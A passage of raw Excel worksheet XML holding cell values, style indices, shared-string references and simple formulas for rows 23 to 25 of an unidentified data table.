        <v>18</v>
      </c>
      <c r="BP23" s="304">
        <v>18</v>
      </c>
      <c r="BQ23" s="304">
        <v>0</v>
      </c>
      <c r="BR23" s="304">
        <f t="shared" si="7"/>
        <v>18</v>
      </c>
      <c r="BS23" s="304">
        <v>18</v>
      </c>
      <c r="BT23" s="304">
        <v>18</v>
      </c>
      <c r="BU23" s="304">
        <v>18</v>
      </c>
      <c r="BV23" s="305">
        <v>18</v>
      </c>
      <c r="BW23" s="324">
        <v>474</v>
      </c>
      <c r="BX23" s="318">
        <v>18</v>
      </c>
      <c r="BY23" s="325" t="s">
        <v>510</v>
      </c>
      <c r="BZ23" s="325">
        <v>4</v>
      </c>
      <c r="CA23" s="325" t="s">
        <v>13</v>
      </c>
      <c r="CB23" s="318">
        <v>2035480</v>
      </c>
      <c r="CC23" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD23" s="318">
        <v>2035480</v>
      </c>
      <c r="CE23" s="318" t="str">
        <f t="shared" si="8"/>
        <v>1394, 2033952, 2025644, -</v>
      </c>
      <c r="CF23" s="318" t="s">
        <v>511</v>
      </c>
      <c r="CG23" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH23" s="318">
        <v>3</v>
      </c>
      <c r="CI23" s="319">
        <v>911</v>
      </c>
      <c r="CJ23" s="319">
        <v>450</v>
      </c>
      <c r="CK23" s="319">
        <v>450</v>
      </c>
      <c r="CL23" s="319">
        <v>0</v>
      </c>
      <c r="CM23" s="319">
        <f t="shared" si="9"/>
        <v>450</v>
      </c>
      <c r="CN23" s="319">
        <v>474</v>
      </c>
      <c r="CO23" s="319">
        <v>450</v>
      </c>
      <c r="CP23" s="319">
        <v>18</v>
      </c>
      <c r="CQ23" s="319">
        <v>456</v>
      </c>
      <c r="CR23" s="319">
        <v>474</v>
      </c>
      <c r="CS23" s="320">
        <v>450</v>
      </c>
      <c r="CT23" s="339">
        <v>478</v>
      </c>
      <c r="CU23" s="340">
        <v>480</v>
      </c>
      <c r="CV23" s="340" t="s">
        <v>512</v>
      </c>
      <c r="CW23" s="340">
        <v>5</v>
      </c>
      <c r="CX23" s="340"/>
      <c r="CY23" s="340" t="s">
        <v>513</v>
      </c>
      <c r="CZ23" s="340" t="s">
        <v>513</v>
      </c>
      <c r="DA23" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB23" s="340" t="str">
        <f t="shared" si="10"/>
        <v>1394, 2033952, 2025644, -</v>
      </c>
      <c r="DC23" s="340" t="s">
        <v>514</v>
      </c>
      <c r="DD23" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE23" s="340">
        <v>3</v>
      </c>
      <c r="DF23" s="341">
        <v>913</v>
      </c>
      <c r="DG23" s="341">
        <v>450</v>
      </c>
      <c r="DH23" s="341">
        <v>450</v>
      </c>
      <c r="DI23" s="341">
        <v>0</v>
      </c>
      <c r="DJ23" s="341">
        <f t="shared" si="11"/>
        <v>450</v>
      </c>
      <c r="DK23" s="341">
        <v>475</v>
      </c>
      <c r="DL23" s="341">
        <v>450</v>
      </c>
      <c r="DM23" s="341">
        <v>22</v>
      </c>
      <c r="DN23" s="341">
        <v>456</v>
      </c>
      <c r="DO23" s="341">
        <v>479</v>
      </c>
      <c r="DP23" s="342">
        <v>450</v>
      </c>
      <c r="DQ23" s="355">
        <v>1395</v>
      </c>
      <c r="DR23" s="356">
        <v>2300</v>
      </c>
      <c r="DS23" s="356" t="s">
        <v>515</v>
      </c>
      <c r="DT23" s="356">
        <v>10</v>
      </c>
      <c r="DU23" s="356"/>
      <c r="DV23" s="356" t="s">
        <v>517</v>
      </c>
      <c r="DW23" s="356" t="s">
        <v>518</v>
      </c>
      <c r="DX23" s="356" t="s">
        <v>516</v>
      </c>
      <c r="DY23" s="356" t="str">
        <f t="shared" si="12"/>
        <v>1394, 2033952, 2025644, -</v>
      </c>
      <c r="DZ23" s="356" t="s">
        <v>511</v>
      </c>
      <c r="EA23" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB23" s="356">
        <v>3</v>
      </c>
      <c r="EC23" s="357">
        <v>911</v>
      </c>
      <c r="ED23" s="357">
        <v>878</v>
      </c>
      <c r="EE23" s="357">
        <v>450</v>
      </c>
      <c r="EF23" s="357">
        <v>0</v>
      </c>
      <c r="EG23" s="357">
        <f t="shared" si="13"/>
        <v>450</v>
      </c>
      <c r="EH23" s="357">
        <v>932</v>
      </c>
      <c r="EI23" s="357">
        <v>450</v>
      </c>
      <c r="EJ23" s="357">
        <v>22</v>
      </c>
      <c r="EK23" s="357">
        <v>1373</v>
      </c>
      <c r="EL23" s="357">
        <v>1395</v>
      </c>
      <c r="EM23" s="358">
        <v>450</v>
      </c>
      <c r="EN23" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP23" s="369"/>
      <c r="EQ23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES23" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV23" s="369"/>
      <c r="EW23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX23" s="369"/>
      <c r="EY23" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ23" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA23" s="369"/>
      <c r="FB23" s="369"/>
      <c r="FC23" s="369">
        <v>911</v>
      </c>
      <c r="FD23" s="369">
        <f t="shared" ref="FD23:FD139" si="15">FE23+FF23</f>
        <v>0</v>
      </c>
      <c r="FE23" s="369">
        <v>0</v>
      </c>
      <c r="FF23" s="369">
        <v>0</v>
      </c>
      <c r="FG23" s="369">
        <v>0</v>
      </c>
      <c r="FH23" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI23" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ23" s="378">
        <v>941</v>
      </c>
      <c r="FK23" s="378"/>
      <c r="FL23" s="378" t="s">
        <v>520</v>
      </c>
      <c r="FM23" s="378">
        <v>7</v>
      </c>
      <c r="FN23" s="378"/>
      <c r="FO23" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP23" s="378" t="s">
        <v>521</v>
      </c>
      <c r="FQ23" s="378"/>
      <c r="FR23" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS23" s="380"/>
      <c r="FT23" s="380"/>
      <c r="FU23" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV23" s="378"/>
      <c r="FW23" s="378"/>
      <c r="FX23" s="378">
        <v>878</v>
      </c>
      <c r="FY23" s="378">
        <f t="shared" si="4"/>
        <v>450</v>
      </c>
      <c r="FZ23" s="378">
        <v>450</v>
      </c>
      <c r="GA23" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB23" s="378">
        <v>451</v>
      </c>
      <c r="GC23" s="379" t="s">
        <v>12</v>
      </c>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c r="IW23" s="40"/>
      <c r="IX23" s="40"/>
      <c r="IY23" s="40"/>
      <c r="IZ23" s="40"/>
      <c r="JA23" s="40"/>
      <c r="JB23" s="40"/>
      <c r="JC23" s="40"/>
      <c r="JD23" s="40"/>
      <c r="JE23" s="40"/>
      <c r="JF23" s="40"/>
      <c r="JG23" s="40"/>
      <c r="JH23" s="40"/>
      <c r="JI23" s="40"/>
      <c r="JJ23" s="40"/>
      <c r="JK23" s="40"/>
      <c r="JL23" s="40"/>
      <c r="JM23" s="40"/>
      <c r="JN23" s="40"/>
      <c r="JO23" s="40"/>
      <c r="JP23" s="40"/>
      <c r="JQ23" s="40"/>
      <c r="JR23" s="40"/>
      <c r="JS23" s="40"/>
      <c r="JT23" s="40"/>
      <c r="JU23" s="40"/>
      <c r="JV23" s="40"/>
      <c r="JW23" s="40"/>
      <c r="JX23" s="40"/>
      <c r="JY23" s="40"/>
      <c r="JZ23" s="40"/>
      <c r="KA23" s="40"/>
      <c r="KB23" s="40"/>
      <c r="KC23" s="40"/>
      <c r="KD23" s="40"/>
      <c r="KE23" s="40"/>
      <c r="KF23" s="40"/>
      <c r="KG23" s="40"/>
      <c r="KH23" s="40"/>
      <c r="KI23" s="40"/>
      <c r="KJ23" s="40"/>
      <c r="KK23" s="40"/>
      <c r="KL23" s="40"/>
      <c r="KM23" s="40"/>
      <c r="KN23" s="40"/>
      <c r="KO23" s="40"/>
      <c r="KP23" s="40"/>
      <c r="KQ23" s="40"/>
      <c r="KR23" s="40"/>
      <c r="KS23" s="40"/>
      <c r="KT23" s="40"/>
      <c r="KU23" s="40"/>
      <c r="KV23" s="40"/>
      <c r="KW23" s="40"/>
      <c r="KX23" s="40"/>
      <c r="KY23" s="40"/>
      <c r="KZ23" s="40"/>
      <c r="LA23" s="40"/>
      <c r="LB23" s="40"/>
      <c r="LC23" s="40"/>
      <c r="LD23" s="40"/>
      <c r="LE23" s="40"/>
      <c r="LF23" s="40"/>
      <c r="LG23" s="40"/>
      <c r="LH23" s="40"/>
      <c r="LI23" s="40"/>
    </row>
    <row r="24" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B24" s="224" t="s">
        <v>256</v>
      </c>
      <c r="C24" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D24" s="225" t="s">
        <v>257</v>
      </c>
      <c r="E24" s="225" t="s">
        <v>522</v>
      </c>
      <c r="F24" s="225">
        <v>15</v>
      </c>
      <c r="G24" s="225" t="s">
        <v>523</v>
      </c>
      <c r="H24" s="226" t="s">
        <v>524</v>
      </c>
      <c r="I24" s="225"/>
      <c r="J24" s="225" t="s">
        <v>525</v>
      </c>
      <c r="K24" s="227" t="s">
        <v>526</v>
      </c>
      <c r="L24" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M24" s="227" t="s">
        <v>436</v>
      </c>
      <c r="N24" s="227" t="s">
        <v>527</v>
      </c>
      <c r="O24" s="389" t="s">
        <v>2679</v>
      </c>
      <c r="P24" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q24" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R24" s="225"/>
      <c r="S24" s="396"/>
      <c r="T24" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U24" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V24" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W24" s="231"/>
      <c r="X24" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y24" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z24" s="256" t="s">
        <v>528</v>
      </c>
      <c r="AA24" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB24" s="256" t="s">
        <v>2421</v>
      </c>
      <c r="AC24" s="226" t="s">
        <v>529</v>
      </c>
      <c r="AD24" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE24" s="259" t="s">
        <v>533</v>
      </c>
      <c r="AF24" s="270" t="s">
        <v>530</v>
      </c>
      <c r="AG24" s="225" t="s">
        <v>531</v>
      </c>
      <c r="AH24" s="271" t="s">
        <v>532</v>
      </c>
      <c r="AI24" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ24" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK24" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL24" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM24" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AN24" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO24" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP24" s="230"/>
      <c r="AQ24" s="230"/>
      <c r="AR24" s="288">
        <v>9</v>
      </c>
      <c r="AS24" s="288">
        <v>1</v>
      </c>
      <c r="AT24" s="288">
        <v>0</v>
      </c>
      <c r="AU24" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV24" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW24" s="288">
        <v>1</v>
      </c>
      <c r="AX24" s="288">
        <v>1</v>
      </c>
      <c r="AY24" s="288">
        <v>0</v>
      </c>
      <c r="AZ24" s="288">
        <f t="shared" si="14"/>
        <v>1</v>
      </c>
      <c r="BA24" s="289" t="s">
        <v>538</v>
      </c>
      <c r="BB24" s="301">
        <v>0</v>
      </c>
      <c r="BC24" s="302">
        <v>0</v>
      </c>
      <c r="BD24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE24" s="302">
        <v>0</v>
      </c>
      <c r="BF24" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ24" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL24" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM24" s="302">
        <v>0</v>
      </c>
      <c r="BN24" s="304">
        <v>9</v>
      </c>
      <c r="BO24" s="304">
        <v>0</v>
      </c>
      <c r="BP24" s="304">
        <v>0</v>
      </c>
      <c r="BQ24" s="304">
        <v>0</v>
      </c>
      <c r="BR24" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS24" s="304">
        <v>0</v>
      </c>
      <c r="BT24" s="304">
        <v>0</v>
      </c>
      <c r="BU24" s="304">
        <v>0</v>
      </c>
      <c r="BV24" s="305">
        <v>0</v>
      </c>
      <c r="BW24" s="317">
        <v>0</v>
      </c>
      <c r="BX24" s="318">
        <v>0</v>
      </c>
      <c r="BY24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ24" s="318">
        <v>0</v>
      </c>
      <c r="CA24" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE24" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG24" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH24" s="318">
        <v>0</v>
      </c>
      <c r="CI24" s="319">
        <v>8</v>
      </c>
      <c r="CJ24" s="319">
        <v>0</v>
      </c>
      <c r="CK24" s="319">
        <v>0</v>
      </c>
      <c r="CL24" s="319">
        <v>0</v>
      </c>
      <c r="CM24" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN24" s="319">
        <v>0</v>
      </c>
      <c r="CO24" s="319">
        <v>0</v>
      </c>
      <c r="CP24" s="319">
        <v>0</v>
      </c>
      <c r="CQ24" s="319">
        <v>0</v>
      </c>
      <c r="CR24" s="319">
        <v>0</v>
      </c>
      <c r="CS24" s="320">
        <v>0</v>
      </c>
      <c r="CT24" s="339">
        <v>0</v>
      </c>
      <c r="CU24" s="340">
        <v>0</v>
      </c>
      <c r="CV24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW24" s="340">
        <v>0</v>
      </c>
      <c r="CX24" s="340"/>
      <c r="CY24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB24" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD24" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE24" s="340">
        <v>0</v>
      </c>
      <c r="DF24" s="341">
        <v>9</v>
      </c>
      <c r="DG24" s="341">
        <v>0</v>
      </c>
      <c r="DH24" s="341">
        <v>0</v>
      </c>
      <c r="DI24" s="341">
        <v>0</v>
      </c>
      <c r="DJ24" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK24" s="341">
        <v>0</v>
      </c>
      <c r="DL24" s="341">
        <v>0</v>
      </c>
      <c r="DM24" s="341">
        <v>0</v>
      </c>
      <c r="DN24" s="341">
        <v>0</v>
      </c>
      <c r="DO24" s="341">
        <v>0</v>
      </c>
      <c r="DP24" s="342">
        <v>0</v>
      </c>
      <c r="DQ24" s="355">
        <v>15</v>
      </c>
      <c r="DR24" s="356">
        <v>1</v>
      </c>
      <c r="DS24" s="356" t="s">
        <v>534</v>
      </c>
      <c r="DT24" s="356">
        <v>6</v>
      </c>
      <c r="DU24" s="356"/>
      <c r="DV24" s="356" t="s">
        <v>536</v>
      </c>
      <c r="DW24" s="356" t="s">
        <v>537</v>
      </c>
      <c r="DX24" s="356" t="s">
        <v>535</v>
      </c>
      <c r="DY24" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2015016, -</v>
      </c>
      <c r="DZ24" s="356">
        <v>2015016</v>
      </c>
      <c r="EA24" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB24" s="356">
        <v>1</v>
      </c>
      <c r="EC24" s="357">
        <v>8</v>
      </c>
      <c r="ED24" s="357">
        <v>4</v>
      </c>
      <c r="EE24" s="357">
        <v>1</v>
      </c>
      <c r="EF24" s="357">
        <v>0</v>
      </c>
      <c r="EG24" s="357">
        <f t="shared" si="13"/>
        <v>1</v>
      </c>
      <c r="EH24" s="357">
        <v>11</v>
      </c>
      <c r="EI24" s="357">
        <v>1</v>
      </c>
      <c r="EJ24" s="357">
        <v>0</v>
      </c>
      <c r="EK24" s="357">
        <v>15</v>
      </c>
      <c r="EL24" s="357">
        <v>15</v>
      </c>
      <c r="EM24" s="358">
        <v>1</v>
      </c>
      <c r="EN24" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP24" s="369"/>
      <c r="EQ24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES24" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV24" s="369"/>
      <c r="EW24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX24" s="369"/>
      <c r="EY24" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ24" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA24" s="369"/>
      <c r="FB24" s="369"/>
      <c r="FC24" s="369">
        <v>8</v>
      </c>
      <c r="FD24" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE24" s="369">
        <v>0</v>
      </c>
      <c r="FF24" s="369">
        <v>0</v>
      </c>
      <c r="FG24" s="369">
        <v>0</v>
      </c>
      <c r="FH24" s="370" t="s">
        <v>539</v>
      </c>
      <c r="FI24" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK24" s="378"/>
      <c r="FL24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN24" s="378"/>
      <c r="FO24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ24" s="378"/>
      <c r="FR24" s="380" t="s">
        <v>390</v>
      </c>
      <c r="FS24" s="380"/>
      <c r="FT24" s="380"/>
      <c r="FU24" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV24" s="378"/>
      <c r="FW24" s="378"/>
      <c r="FX24" s="378">
        <v>8</v>
      </c>
      <c r="FY24" s="378">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="FZ24" s="378">
        <v>0</v>
      </c>
      <c r="GA24" s="378" t="s">
        <v>391</v>
      </c>
      <c r="GB24" s="378">
        <v>1</v>
      </c>
      <c r="GC24" s="379" t="s">
        <v>12</v>
      </c>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c r="IW24" s="40"/>
      <c r="IX24" s="40"/>
      <c r="IY24" s="40"/>
      <c r="IZ24" s="40"/>
      <c r="JA24" s="40"/>
      <c r="JB24" s="40"/>
      <c r="JC24" s="40"/>
      <c r="JD24" s="40"/>
      <c r="JE24" s="40"/>
      <c r="JF24" s="40"/>
      <c r="JG24" s="40"/>
      <c r="JH24" s="40"/>
      <c r="JI24" s="40"/>
      <c r="JJ24" s="40"/>
      <c r="JK24" s="40"/>
      <c r="JL24" s="40"/>
      <c r="JM24" s="40"/>
      <c r="JN24" s="40"/>
      <c r="JO24" s="40"/>
      <c r="JP24" s="40"/>
      <c r="JQ24" s="40"/>
      <c r="JR24" s="40"/>
      <c r="JS24" s="40"/>
      <c r="JT24" s="40"/>
      <c r="JU24" s="40"/>
      <c r="JV24" s="40"/>
      <c r="JW24" s="40"/>
      <c r="JX24" s="40"/>
      <c r="JY24" s="40"/>
      <c r="JZ24" s="40"/>
      <c r="KA24" s="40"/>
      <c r="KB24" s="40"/>
      <c r="KC24" s="40"/>
      <c r="KD24" s="40"/>
      <c r="KE24" s="40"/>
      <c r="KF24" s="40"/>
      <c r="KG24" s="40"/>
      <c r="KH24" s="40"/>
      <c r="KI24" s="40"/>
      <c r="KJ24" s="40"/>
      <c r="KK24" s="40"/>
      <c r="KL24" s="40"/>
      <c r="KM24" s="40"/>
      <c r="KN24" s="40"/>
      <c r="KO24" s="40"/>
      <c r="KP24" s="40"/>
      <c r="KQ24" s="40"/>
      <c r="KR24" s="40"/>
      <c r="KS24" s="40"/>
      <c r="KT24" s="40"/>
      <c r="KU24" s="40"/>
      <c r="KV24" s="40"/>
      <c r="KW24" s="40"/>
      <c r="KX24" s="40"/>
      <c r="KY24" s="40"/>
      <c r="KZ24" s="40"/>
      <c r="LA24" s="40"/>
      <c r="LB24" s="40"/>
      <c r="LC24" s="40"/>
      <c r="LD24" s="40"/>
      <c r="LE24" s="40"/>
      <c r="LF24" s="40"/>
      <c r="LG24" s="40"/>
      <c r="LH24" s="40"/>
      <c r="LI24" s="40"/>
    </row>
    <row r="25" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B25" s="224" t="s">
        <v>256</v>
      </c>
      <c r="C25" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D25" s="225" t="s">
        <v>257</v>
      </c>
      <c r="E25" s="225" t="s">
        <v>522</v>
      </c>
      <c r="F25" s="225">
        <v>15</v>
      </c>
      <c r="G25" s="225" t="s">
        <v>523</v>
      </c>
      <c r="H25" s="226" t="s">
        <v>524</v>
      </c>
      <c r="I25" s="225"/>
      <c r="J25" s="225" t="s">
        <v>525</v>
      </c>
      <c r="K25" s="227" t="s">
        <v>540</v>
      </c>
      <c r="L25" s="228" t="s">
        <v>543</v>
      </c>
      <c r="M25" s="227" t="s">
        <v>541</v>
      </c>
      <c r="N25" s="227" t="s">
        <v>542</v>
      </c>
      <c r="O25" s="389" t="s">
        <v>2680</v>
      </c>
      <c r="P25" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q25" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R25" s="225"/>
      <c r="S25" s="396"/>
      <c r="T25" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U25" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V25" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W25" s="231"/>
      <c r="X25" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y25" s="255" t="s">
        <v>236</v>
      </c>
      <c r="Z25" s="256" t="s">
        <v>2422</v>
      </c>
      <c r="AA25" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB25" s="256" t="s">
        <v>2423</v>
      </c>
      <c r="AC25" s="226" t="s">
        <v>544</v>
      </c>
      <c r="AD25" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE25" s="259" t="s">
        <v>548</v>
      </c>
      <c r="AF25" s="270" t="s">
        <v>545</v>
      </c>
      <c r="AG25" s="225" t="s">
        <v>546</v>
      </c>
      <c r="AH25" s="273" t="s">
        <v>547</v>
      </c>
      <c r="AI25" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ25" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK25" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL25" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM25" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN25" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO25" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP25" s="230"/>
      <c r="AQ25" s="230"/>
      <c r="AR25" s="288">
        <v>1</v>
      </c>
      <c r="AS25" s="288">
        <v>1</v>
      </c>
      <c r="AT25" s="288">
        <v>0</v>
      </c>
      <c r="AU25" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV25" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW25" s="288">
        <v>1</v>
      </c>
      <c r="AX25" s="288">
        <v>16</v>
      </c>
      <c r="AY25" s="288">
        <v>0</v>
      </c>
      <c r="AZ25" s="288">
        <f t="shared" si="14"/>
        <v>16</v>
      </c>
      <c r="BA25" s="289" t="s">
        <v>560</v>
      </c>
      <c r="BB25" s="301">
        <v>48</v>
      </c>
      <c r="BC25" s="302">
        <v>0</v>
      </c>
      <c r="BD25" s="302" t="s">
        <v>549</v>
      </c>
      <c r="BE25" s="302">
        <v>3</v>
      </c>
      <c r="BF25" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG25" s="302" t="s">
        <v>550</v>
      </c>
      <c r="BH25" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI25" s="302" t="s">
        <v>551</v>
      </c>
      <c r="BJ25" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK25" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL25" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM25" s="302">
        <v>0</v>
      </c>
      <c r="BN25" s="304">
        <v>1</v>
      </c>
      <c r="BO25" s="304">
        <v>0</v>
      </c>
      <c r="BP25" s="304">
        <v>0</v>
      </c>
      <c r="BQ25" s="304">
        <v>0</v>
      </c>
      <c r="BR25" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS25" s="304">
        <v>32</v>
      </c>
      <c r="BT25" s="304">
        <v>0</v>
      </c>
      <c r="BU25" s="304">
        <v>48</v>
      </c>
      <c r="BV25" s="305">
        <v>0</v>
      </c>
      <c r="BW25" s="317">
        <v>48</v>
      </c>
      <c r="BX25" s="318">
        <v>0</v>
      </c>
      <c r="BY25" s="318" t="s">
        <v>549</v>
      </c>
      <c r="BZ25" s="318">
        <v>3</v>
      </c>
      <c r="CA25" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB25" s="318" t="s">
        <v>552</v>
      </c>
      <c r="CC25" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD25" s="318" t="s">
        <v>553</v>
      </c>
      <c r="CE25" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF25" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG25" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH25" s="318">
        <v>0</v>
      </c>
      <c r="CI25" s="319">
        <v>0</v>
      </c>
      <c r="CJ25" s="319">
        <v>0</v>
      </c>
      <c r="CK25" s="319">
        <v>0</v>
      </c>
      <c r="CL25" s="319">
        <v>0</v>
      </c>
      <c r="CM25" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN25" s="319">
        <v>32</v>
      </c>
      <c r="CO25" s="319">
        <v>0</v>
      </c>
      <c r="CP25" s="319">
        <v>48</v>
      </c>
      <c r="CQ25" s="319">
        <v>0</v>
      </c>
      <c r="CR25" s="319">
        <v>48</v>
      </c>
      <c r="CS25" s="320">
        <v>0</v>
      </c>
      <c r="CT25" s="339">
        <v>112</v>
      </c>
      <c r="CU25" s="340">
        <v>0</v>
      </c>
      <c r="CV25" s="340" t="s">
        <v>554</v>
      </c>
      <c r="CW25" s="340">
        <v>4</v>
      </c>
      <c r="CX25" s="340"/>
      <c r="CY25" s="340" t="s">
        <v>555</v>
      </c>
      <c r="CZ25" s="340">
        <v>31767</v>
      </c>
      <c r="DA25" s="340" t="s">
        <v>556</v>
      </c>
      <c r="DB25" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC25" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD25" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE25" s="340">
        <v>0</v>
      </c>
      <c r="DF25" s="341">
        <v>1</v>
      </c>
      <c r="DG25" s="341">
        <v>0</v>
      </c>
      <c r="DH25" s="341">
        <v>0</v>
      </c>
      <c r="DI25" s="341">
        <v>0</v>
      </c>
      <c r="DJ25" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK25" s="341">
        <v>32</v>
      </c>
      <c r="DL25" s="341">
        <v>0</v>
      </c>
      <c r="DM25" s="341">
        <v>64</v>
      </c>
      <c r="DN25" s="341">
        <v>0</v>
      </c>
      <c r="DO25" s="341">
        <v>64</v>
      </c>
      <c r="DP25" s="342">
        <v>0</v>
      </c>
      <c r="DQ25" s="355">
        <v>100</v>
      </c>
      <c r="DR25" s="356">
        <v>0</v>
      </c>
      <c r="DS25" s="356" t="s">
        <v>557</v>
      </c>
      <c r="DT25" s="356">
        <v>8</v>
      </c>
      <c r="DU25" s="356"/>
      <c r="DV25" s="356" t="s">
        <v>558</v>
      </c>
      <c r="DW25" s="356">
        <v>31767</v>
      </c>
